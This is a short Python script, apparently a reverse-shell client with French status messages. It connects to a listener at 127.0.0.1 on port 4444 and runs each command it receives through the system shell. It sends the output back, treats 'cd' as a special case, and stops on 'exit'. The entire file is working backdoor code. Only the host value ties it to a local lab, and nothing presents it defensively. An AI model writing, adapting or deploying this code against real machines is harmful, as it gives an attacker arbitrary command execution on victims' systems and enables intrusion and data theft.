import socket
import subprocess
import os

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 4444

client.connect((host, port))

while True:
    cmd = client.recv(1024).decode()
    if cmd.lower() == "exit":
        break

    if cmd.startswith("cd "):
        try:
            path = cmd[3:].strip()
            os.chdir(path)
            output = f"[+] Répertoire changé vers : {os.getcwd()}"
        except Exception as e:
            output = f"[!] Erreur : {str(e)}"
    else:
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, cwd=os.getcwd()).decode()
        except subprocess.CalledProcessError as e:
            output = e.output.decode()
        except Exception as e:
            output = f"[!] Erreur : {str(e)}"

    client.send(output.encode())

client.close()
print("[+] Connexion fermée.")